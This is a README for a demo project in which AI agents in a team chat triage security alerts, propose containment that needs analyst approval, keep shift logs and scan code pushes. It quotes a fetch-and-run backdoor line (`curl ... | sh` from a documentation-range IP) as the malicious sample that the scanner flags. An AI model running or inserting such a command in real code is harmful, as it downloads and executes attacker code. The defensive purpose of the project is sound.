# SOC Shift Relay

**AI agents that keep watch between SOC shifts, inside the team's chat.** Built on [Switch](https://docs.switchagents.ai/),
so the same room can run in Slack, Microsoft Teams, Discord, Mattermost or Telegram, with Claude Code, Codex,
Cursor, OpenCode or Antigravity as the agents ([how](#other-chat-apps-and-ai-agents)). We run it with Claude Code
agents in Discord.

Security operations teams work in shifts. At every handover context gets lost, and at 2 AM alerts wait for a
person who is asleep. SOC Shift Relay puts four AI agents into the SOC's team chat with Switch:

- **@triage** checks every alert against the runbook, closes the known noise, and answers employees who report problems.
- **@responder** prepares containment (block an IP, disable an account, isolate a host) and runs it **only after
  the on-call analyst approves in chat**. Switch records who approved.
- **@scribe** keeps the **shift log**, the team's memory, and the **on-call roster**, so work skips whoever is on
  leave. It tells the next analyst where to start and writes a **shift or incident report** on request.
- **@appsec** scans **every code push** for leaked secrets, risky code, vulnerable dependencies and malware, flags
  it, hands attacker addresses to @responder, and prepares a fix that it re-scans clean. It never merges.

A fifth agent plays the SIEM, the alerting system, and replays a night of sample alerts and one code push.

## How it works

```
                     #security-help  (employees)
   "I clicked a link..."  ──▶  @triage ──── link: "escalates to the SOC desk" ────┐
                                                                                 ▼
   SIEM (soc-siem)   ── alerts ──▶  #soc-shift  (analysts on shifts, on-call)
                     ── pushes ─┐    │
                                │    ├─ @triage    decides: close (Tier 0) / contain / needs a person
                                │    │      │ hand-off with evidence
                                ▼    │      ▼
                   @appsec scans ────┼─▶ @responder proposes ─▶ Switch approval request ─▶ on-call: Allow once / Decline
                   BLOCK + fix +     │      │ runs one lab action script, writes audit.log
                   appsec-PUSH doc   │      ▼
                                     └─ @scribe    shift-log + on-call-roster documents ─▶ "@scribe brief me"
                                                   "@scribe report" ─▶ report document with the audit trail
```

## Agents and channels at a glance

Five AI agents, run by Switch Console on one computer and connected to the team's chat app. Our setup: Claude Code
on Windows, in Discord through one bot.
Each works in its own folder, `workspaces/<agent>`, with its own brief and permission rules.

| Agent (Switch name) | Job (Switch role) | Rooms | Who can direct it | Mode |
| --- | --- | --- | --- | --- |
| `soc-triage` | triage (shared) | #soc-shift, and #security-help as its main agent | Anyone | Auto mode |
| `soc-responder` | responder (exclusive) | #soc-shift | The owner (on-call) and the owner's agents | **Auto mode off**: every action script waits for Allow once |
| `soc-scribe` | scribe (exclusive) | #soc-shift | Anyone | Auto mode |
| `soc-appsec` | appsec (exclusive) | #soc-shift | The owner and the owner's agents | Auto mode; writes only its `fixes/` and `reports/` |
| `soc-siem` | none, it is the alert feed | #soc-shift | The owner only | Auto mode |

- **#soc-shift**, the SOC desk: all five agents and the on-call analyst (the agents' owner). It holds the four
  jobs and the room documents: `runbook` (people), `shift-log` and `on-call-roster` (@scribe), `report-...`
  (@scribe, on request) and `appsec-PUSH-...` (@appsec).
- **#security-help**, for every employee: only `soc-triage`, set as the room's main agent (`!assign-agent`) so
  nobody needs to type @. It is linked to #soc-shift ("escalates to the SOC desk").

## Why it needs Switch

| Switch feature | How SOC Shift Relay uses it |
| --- | --- |
| **Rooms on a chat app** | The SOC desk (#soc-shift) and the employee help room (#security-help) are channels in the chat app the team already uses (Slack, Microsoft Teams, Discord, Mattermost or Telegram); people need nothing installed. |
| **Roles (jobs)** | `triage` is shared; `responder`, `scribe` and `appsec` are exclusive, so only one agent ever acts and the log has one author. People address the job (`@scribe`), so if an agent goes offline another can take the job: the shift idea applied to agents. For people, the on-call roster does the same: work goes to whoever covers someone on leave. |
| **Approvals in chat** | Every containment action triggers a Switch approval request; on-call answers Allow once or Decline, and Switch records who answered. @responder runs with Auto mode off and every action script set to ask, so nothing changes until on-call answers. |
| **Room documents** | The `runbook` document (written by people, created by the template) is every agent's contract. @scribe keeps `shift-log`, the memory that survives every handover, and `on-call-roster`, who is away and who covers, and writes `report-...` documents on request. @appsec writes one `appsec-PUSH-...` document per push. Switch lets an agent change only a document it created, so each document has exactly one author. |
| **Who can talk to an agent** | Employees can reach @triage but never @responder; only the on-call owner can order containment. Refusals show in the channel. |
| **Linked rooms** | #security-help links to #soc-shift, so triage escalates from employees to analysts. |
| **Templates** | `switch/soc-shift-relay.template.yaml` recreates all five agents, both rooms, the link, the four roles, the runbook and the kickoff in one click. |

Without Switch there is no shared room, no job hand-offs, no approval trail and no memory across shifts: the agents
would be five separate chatbots.

## The runbook decides what agents may do

| Tier | Examples | Who acts |
| --- | --- | --- |
| 0 Automatic | Look up an IP, set severity, close a known false positive, give an employee safety steps, scan a push and prepare a fix, keep the roster, write a report | Agents alone, logged |
| 1 Approval | Block or unblock an IP, disable or re-enable an account, isolate or release a host | @responder proposes, on-call approves with Allow once |
| 2 Never | Delete data, block internal or protected targets, contact outsiders, merge or deploy code, rotate a leaked key | People only |

Being away never counts as approval: if on-call is on leave, a Tier 1 action waits and leads the next brief.

### Enforced, not only instructed

A brief that says "wait for approval" is a request a model can ignore. Every rule above is also held by
something outside the prompt:

| Rule | Enforced by |
| --- | --- |
| Employees cannot order containment | Switch: @responder takes messages only from its owner and the owner's agents; anyone else gets a visible refusal |
| Nothing changes without on-call | Claude Code: @responder's settings mark every action script `ask` and its Auto mode is off, so the script waits for the Switch approval request |
| Protected targets are never touched | The action scripts refuse internal and reserved ranges, the company VPN, the scanner and service accounts, even when approved |
| No side doors | Claude Code deny rules (`agent-settings.json`, installed to `.claude/settings.json`) block edits to the lab state and all network tools |
| The log has one author | Switch: only the agent that created a room document can change it |
| @appsec cannot change or run the code it scans | Claude Code deny rules: no writes to `pushes/`, `repo/`, `tools/` or `rules/`, no `sh`, `bash`, `pip` or running pushed files; it writes only `fixes/` and `reports/` |
| Secrets do not spread | The scanner redacts every secret it finds, in chat and in documents (a test checks the full key never appears) |
| Reports cannot invent an approval | @scribe's actions table comes from `tools/audit_trail.py`, a read-only view of the audit log |
| Everything leaves a trail | Each action, refusal and no-op is a JSON line in `state/audit.log`; Switch records who approved or declined |

The Claude Code rows are that agent's own permission settings; with another agent, the same limits go in its
settings ([see below](#other-chat-apps-and-ai-agents)). The other rows hold whichever agent runs.

Checked on 7 Nov 2026 with a throwaway Claude Code session in `workspaces/responder`: the block script was
refused without an approval, and a write into `state/` was refused even with Write allowed on the command line
("File is in a directory that is denied by your permission settings").

## The demo night

| Time (IST) | What happens | Outcome |
| --- | --- | --- |
| 23:00 | Analyst A: "@scribe end of shift", and "Asha Rao is on leave, Spider covers her" | Handover posted; on-call-roster updated, so her follow-ups go to Spider |
| 01:12 | ALERT-1001 port scan from 10.0.5.20 | @triage matches rule FP-01 (approved weekly scan) and closes it |
| 01:47 | ALERT-1002 SSH brute force from 203.0.113.45, threat score 92 | @responder proposes a block, on-call approves, IP blocked and logged |
| 02:05 | ALERT-1003 impossible travel, priya.sharma | Travel calendar makes it ambiguous; on-call declines the disable; waits for the day shift |
| 02:20 | Employee in #security-help: clicked a phishing link | @triage gives steps and a ticket, escalates to #soc-shift |
| 02:40 | PUSH-2001: a contractor's "hotfix" to payments-api main | @appsec: BLOCK, 5 findings (a `curl \| sh` backdoor, a live API key, SQL injection, two vulnerable packages); @responder blocks the download host after Allow once; fix prepared and re-scanned PASS |
| 09:00 | Analyst B: "@scribe brief me", then "@scribe report" | Five items, owners on duty, what is waiting, "start here"; a shift report document with the approval trail |

All data is fictional: IPs come from documentation ranges, the leaked key is fake, and nothing touches a real
system.

**What the agents wrote in the recorded run** is in [docs/examples/](docs/examples/): the
[shift report](docs/examples/shift-report-2026-11-07.md) with its approval trail, the
[shift log](docs/examples/shift-log.md), the [on-call roster](docs/examples/on-call-roster.md) after the leave
update, the [appsec report](docs/examples/appsec-PUSH-2001.md) and [the fix](docs/examples/fix-PUSH-2001/) that
re-scans PASS.

## AppSec on every push

The SIEM passes each push to @appsec (in production: a webhook from GitHub or GitLab). `tools/scan.py` checks
only the lines the push adds or changes, so old code does not drown the new problem:

| Check | Modelled on | In the demo push |
| --- | --- | --- |
| Leaked secrets | Gitleaks | A live payment API key in `app/config.py` (redacted in every output) |
| Risky code | Semgrep | An f-string SQL query in `app/orders.py` (SQL injection) |
| Vulnerable dependencies | OSV-Scanner, Trivy | PyYAML 5.3 and requests 2.19.1, five public CVEs |
| Malware patterns | YARA | `curl -s http://198.51.100.23/update.sh \| sh` in the deploy script |

The verdict is BLOCK, PASS or WARN. @appsec writes the fix as a proposed change (`fixes/PUSH-2001/`, like a
pull request), keeps what the push meant to do, re-scans it until PASS, and records everything in the
`appsec-PUSH-2001` room document. Merging and rotating the key stay with people (Tier 2). The scanner is standard
library and offline, so a fresh clone runs the same demo; for production, put the real tools' read-only
commands on @appsec's allow list.

## Run it yourself

Full guide: [docs/SETUP.md](docs/SETUP.md) (Windows, Discord and Claude Code, about an hour the first time).

1. Install [Switch Console](https://github.com/sandbox-quantum/switch/releases/latest), run the server on your
   computer, and sign in to Claude Code.
2. Connect your chat app under **Home > Messaging apps**: a Discord server and bot in our setup, or Slack,
   Microsoft Teams, Mattermost or Telegram with
   [Switch's guide for that app](https://docs.switchagents.ai/switch-rooms/deploy/messaging-apps/index.md).
3. **Templates > Import template** > `switch/soc-shift-relay.template.yaml` > **Use**. Pick your chat app
   connection, and set **Project folder** to where you cloned this repo.
4. `python tools/install_agent_settings.py --trust` (installs the agents' permission rules and trusts their
   folders, so Claude Code applies their allow rules) and `python tools/reset_demo.py`, then in #soc-shift:
   `@soc-siem start night shift`, and later `@soc-siem code push`.

Tests (standard library only): `python -m unittest discover -s tests -v`

## Other chat apps and AI agents

The briefs, runbook, lab and template are not tied to one chat app or one AI agent: Switch sits between them.

**Chat apps.** Switch connects the same rooms to
[Slack, Microsoft Teams, Mattermost, Discord or Telegram](https://docs.switchagents.ai/switch-rooms/deploy/messaging-apps/index.md).
Each channel becomes a room, and roles, approvals and room documents work the same way. Connect the app in Switch
Console, then pick that connection when you import the template. The differences are each app's own: Teams needs
Switch reachable from the internet and wants the Switch bot mentioned before a typed command, and some apps also
offer the room commands as slash commands
([room commands](https://docs.switchagents.ai/switch-rooms/resources/room-commands.md)).

**AI agents.** Switch starts each agent with the
[provider you choose](https://docs.switchagents.ai/switch-rooms/getting-started/set-up-agent-providers.md):
Claude Code, Codex, Cursor, OpenCode or Antigravity. Switch hands every agent its brief directly, so the briefs
work with any of them. We built and tested with Claude Code. To switch:

1. **Choose the provider.** The template pins `provider: claude` (set in `tools/build_template.py`, because Switch
   Console on Windows cannot fill a provider picker in a template). Change it to `codex`, `opencode` or
   `antigravity` and run `python tools/build_template.py`, or create the agents by hand in Switch Console and
   pick any provider, Cursor included ([docs/SETUP.md](docs/SETUP.md), manual setup).
2. **Carry over the guardrails.** `agent-settings.json` holds Claude Code permission rules. Set the same limits
   in the new provider's own settings: @responder never runs an action script without asking, and no agent can
   edit `state/` or reach the network.
3. **Keep @responder asking.** Auto mode differs by provider: Claude Code and Codex review each action
   themselves, Antigravity asks before commands, Cursor asks before every action, and OpenCode's Auto mode
   approves everything. Keep Auto mode off for @responder whatever the provider.

Each agent has its own provider setting, so one room can mix them, for example @triage on Codex and @responder
on Claude Code. Whatever the agent, Switch's roles, who-can-talk rules and one-author documents still apply, and
so do the lab's own checks: protected targets are refused and every action goes into the audit log.

## Repo map

| Path | What |
| --- | --- |
| `switch/` | Room instructions, roles, runbook, and the generated template |
| `workspaces/<agent>/` | Each agent's working directory: `AGENT.md` brief, permissions, data |
| `workspaces/responder/actions/` | The only scripts that change state (lab files only), with guardrails and audit log |
| `workspaces/triage/tools/lookup.py` | Read-only lookups over the intel data |
| `workspaces/appsec/` | `tools/scan.py` (read-only scanner), `rules/` (rules and offline advisories), `repo/` (main), `pushes/` (the pushed code) |
| `workspaces/scribe/` | Mirrors of the shift log and roster, `tools/audit_trail.py` (read-only trail for reports) |
| `tools/` | `build_template.py` (sources to template), `reset_demo.py` (fresh lab) |
| `alert_feed/` | Optional: the alert feed as a custom agent on the Switch agent protocol |
| `docs/` | Setup guide, demo script, and what the agents wrote in the recorded run (`examples/`) |

## Beyond security

Only the runbook and the lab are security-specific. Swap them and the same room serves an IT helpdesk, a
customer-support shift or a network operations team: triage, an approval-gated responder, and a scribe that
briefs whoever starts the next shift.

## What's next

- **Real scanners and a real webhook.** Run Gitleaks, Semgrep, OSV-Scanner or Trivy and YARA next to the built-in
  rules, and let the code host's push webhook replace the SIEM replay. The tiers stay the same: a fix is a
  proposed change, and anything that changes production waits for Allow once or a person.
- **The SIEM as a plain program.** `alert_feed/` posts alerts through Switch's agent protocol, so any monitoring
  tool, not only an AI agent, can join the room.

## License

MIT, see [LICENSE](LICENSE).
